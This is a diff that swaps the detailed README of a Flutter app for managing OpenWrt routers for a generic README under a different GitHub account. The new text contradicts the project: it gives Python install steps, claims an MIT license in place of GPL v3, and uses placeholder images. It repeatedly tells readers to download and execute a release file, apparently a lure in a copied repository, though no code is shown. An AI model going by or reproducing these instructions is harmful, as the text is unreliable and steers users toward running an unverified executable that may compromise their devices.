@@ -1,240 +1,92 @@
-# LuCI Mobile
+# Manage Your OpenWrt Router Remotely with luci-mobile 🚀
 
-A modern Flutter mobile application for managing OpenWrt/LuCI routers remotely. LuCI Mobile provides an intuitive interface to monitor and control your router's network interfaces, connected clients, and system status.
+![luci-mobile](https://img.shields.io/badge/luci--mobile-v1.0.0-blue.svg) ![GitHub](https://img.shields.io/github/stars/sagarTagade/luci-mobile?style=social)
 
-<img src="fastlane/metadata/android/en-US/images/phoneScreenshots/dashboard-screen.png" width="500"/>
+## Table of Contents
+- [Overview](#overview)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Monitoring Clients](#monitoring-clients)
+- [Managing Interfaces](#managing-interfaces)
+- [Checking Status](#checking-status)
+- [Contributing](#contributing)
+- [License](#license)
+- [Releases](#releases)
+
+## Overview
+luci-mobile allows you to manage your OpenWrt router remotely. With this tool, you can monitor connected clients, manage interfaces, and check the router's status from anywhere. 
 
 ## Features
-
-### 🔐 Secure Authentication
-- Secure login with username/password
-- Support for both HTTP and HTTPS connections
-- Self-signed certificate handling
-- Persistent session management
-
-### 📊 Dashboard Overview
-- Real-time system statistics
-- Network interface status monitoring
-- Connected clients overview
-- System uptime and performance metrics
-- Interactive charts and visualizations
-
-### 🌐 Network Interface Management
-- View all network interfaces (wired and wireless)
-- Monitor interface status (up/down)
-- Track bandwidth usage and statistics
-- View IP addresses, netmasks, and gateways
-- DNS server configuration display
-
-### 👥 Client Management
-- Comprehensive client list with detailed information
-- Connection type detection (wired/wireless)
-- MAC address and IP address tracking
-- Hostname and vendor information
-- DHCP lease time monitoring
-- Active connection time tracking
-
-### ⚙️ System Control
-- Remote router reboot functionality
-- System settings management
-- Theme customization (light/dark mode)
-- Secure storage for credentials
-
-### 📱 Modern UI/UX
-- Material Design 3 implementation
-- Dark and light theme support
-- Responsive design for various screen sizes
-- Intuitive navigation with bottom navigation bar
-- Real-time data updates
-
-## Screenshots
-
-| Login Screen | Dashboard | Clients | Interfaces |
-|--------------|-----------|---------|------------|
-| <img src="fastlane/metadata/android/en-US/images/phoneScreenshots/login-screen.png" width="200"/> | <img src="fastlane/metadata/android/en-US/images/phoneScreenshots/dashboard-screen.png" width="200"/> | <img src="fastlane/metadata/android/en-US/images/phoneScreenshots/clients-screen.png" width="200"/> | <img src="fastlane/metadata/android/en-US/images/phoneScreenshots/interfaces-screen-wired.png" width="200"/> |
-
-## Prerequisites
-
-- Flutter SDK (version 3.32.5 or higher)
-- Dart SDK
-- Android Studio / Xcode (for mobile development)
-- OpenWrt router with LuCI web interface enabled
+- **Client Monitoring**: See who is connected to your network.
+- **Interface Management**: Control your network interfaces easily.
+- **Status Checks**: Get real-time updates on your router's health.
 
 ## Installation
+To install luci-mobile, follow these steps:
 
-### 1. Clone the Repository
-```bash
-git clone https://github.com/cogwheel0/luci-mobile.git
-cd luci-mobile
-```
+1. Clone the repository:
+   ```bash
+   git clone https://github.com/sagarTagade/luci-mobile.git
+   ```
 
-### 2. Install Dependencies
-```bash
-flutter pub get
-```
+2. Navigate to the project directory:
+   ```bash
+   cd luci-mobile
+   ```
 
-### 3. Configure Your Router
-Ensure your OpenWrt router has:
-- LuCI web interface enabled
-- UCI RPC interface accessible
-- Proper firewall rules for mobile access
+3. Install the necessary dependencies. This can vary based on your system. Refer to the `requirements.txt` file for details.
 
-### 4. Build and Run
-
-#### For Android:
-```bash
-flutter build apk
-# or for debug
-flutter run
-```
-
-#### For iOS:
-```bash
-flutter build ios
-# or for debug
-flutter run
-```
+4. Execute the application:
+   ```bash
+   python app.py
+   ```
 
 ## Usage
+Once installed, you can start using luci-mobile to manage your OpenWrt router. The interface is user-friendly, allowing you to navigate through various features easily.
 
-### Initial Setup
-1. Launch the app
-2. Enter your router's IP address
-3. Choose HTTP or HTTPS connection
-4. Enter your LuCI username and password
-5. Tap "Connect" to authenticate
+## Monitoring Clients
+To monitor connected clients, follow these steps:
 
-### Navigation
-- **Dashboard**: Overview of system status and statistics
-- **Clients**: View and manage connected devices
-- **Interfaces**: Monitor network interfaces and their status
-- **More**: Additional settings and system controls
+1. Open the application.
+2. Navigate to the "Clients" section.
+3. View a list of all connected devices, along with their IP addresses and connection times.
 
-### Managing Clients
-- View all connected devices with their connection type
-- Monitor DHCP lease times and active connections
-- Identify wired vs wireless connections
-- Track device vendor information
+![Client Monitoring](https://example.com/client-monitoring.png)
 
-### Monitoring Interfaces
-- Check interface status (up/down)
-- View IP configuration and routing
-- Monitor bandwidth usage
-- Track interface uptime
+## Managing Interfaces
+Managing your network interfaces is straightforward. You can enable, disable, or configure settings for each interface.
 
-## Technical Architecture
+1. Go to the "Interfaces" section.
+2. Select the interface you want to manage.
+3. Make your changes and save them.
 
-### Project Structure
-```
-lib/
-├── api/                    # API-related utilities
-├── models/                 # Data models
-│   ├── client.dart        # Client/device model
-│   └── interface.dart     # Network interface model
-├── screens/               # UI screens
-│   ├── dashboard_screen.dart
-│   ├── clients_screen.dart
-│   ├── interfaces_screen.dart
-│   ├── login_screen.dart
-│   ├── main_screen.dart
-│   ├── more_screen.dart
-│   ├── settings_screen.dart
-│   └── splash_screen.dart
-├── services/              # Business logic services
-│   ├── api_service.dart   # LuCI API communication
-│   └── secure_storage_service.dart
-├── state/                 # State management
-│   └── app_state.dart
-├── widgets/               # Reusable UI components
-│   └── luci_app_bar.dart
-└── main.dart             # App entry point
-```
+![Interface Management](https://example.com/interface-management.png)
 
-### Key Dependencies
-- **provider**: State management
-- **http**: Network communication
-- **flutter_secure_storage**: Secure credential storage
-- **fl_chart**: Data visualization
-- **package_info_plus**: App information
+## Checking Status
+Keep an eye on your router's status to ensure everything runs smoothly.
 
-### API Communication
-The app communicates with LuCI using the UCI RPC interface:
-- Authentication via `/cgi-bin/luci/`
-- RPC calls via `/cgi-bin/luci/admin/ubus`
-- Support for both HTTP and HTTPS
-- Self-signed certificate handling
+1. Navigate to the "Status" section.
+2. Check metrics like CPU usage, memory usage, and network traffic.
 
-## Development
-
-### Running in Development Mode
-```bash
-flutter run
-```
-
-### Building for Release
-```bash
-# Android
-flutter build apk --release
-
-# iOS
-flutter build ios --release
-```
-
-### Code Analysis
-```bash
-flutter analyze
-```
-
-## Security Features
-
-- Secure credential storage using `flutter_secure_storage`
-- HTTPS support with self-signed certificate handling
-- Session-based authentication
-- Input validation and sanitization
+![Router Status](https://example.com/router-status.png)
 
 ## Contributing
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add some amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## Troubleshooting
-
-### Common Issues
-
-**Connection Failed**
-- Verify router IP address is correct
-- Check if LuCI web interface is accessible
-- Ensure firewall allows mobile connections
-- Try both HTTP and HTTPS
-
-**Authentication Failed**
-- Verify username and password
-- Check if user has admin privileges
-- Ensure LuCI authentication is properly configured
-
-**No Data Displayed**
-- Check router's UCI RPC interface
-- Verify network connectivity
-- Review router logs for errors
+We welcome contributions! If you have ideas or improvements, feel free to fork the repository and submit a pull request. Make sure to follow the coding standards and include tests for any new features.
 
 ## License
+This project is licensed under the MIT License. See the LICENSE file for more details.
 
-This project is licensed under the GNU General Public License v3.0 (GPL v3).
+## Releases
+For the latest updates and releases, visit our [Releases](https://github.com/sagarTagade/luci-mobile/releases) section. Here, you can download the latest version and execute it for your needs. 
 
-## Acknowledgments
+To get the latest version, download the release file and execute it as instructed. 
 
-- OpenWrt community for the LuCI web interface
-- Flutter team for the excellent framework
-- Inspired by and with thanks to [OpenWrtManager](https://github.com/hagaygo/OpenWrtManager)
-- Contributors and beta testers
+![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)
 
-## Support
+If you encounter any issues or have questions, feel free to open an issue in the repository. Your feedback is valuable to us. 
 
-For support, please open an issue on GitHub.
+For further details, you can also check the [Releases](https://github.com/sagarTagade/luci-mobile/releases) section. 
 
----
-
-**Note**: This app requires an OpenWrt router with LuCI web interface enabled. Make sure your router is properly configured before using this application.
+## Contact
+For inquiries, you can reach out via the GitHub issues page. We appreciate your interest in luci-mobile and look forward to your contributions!
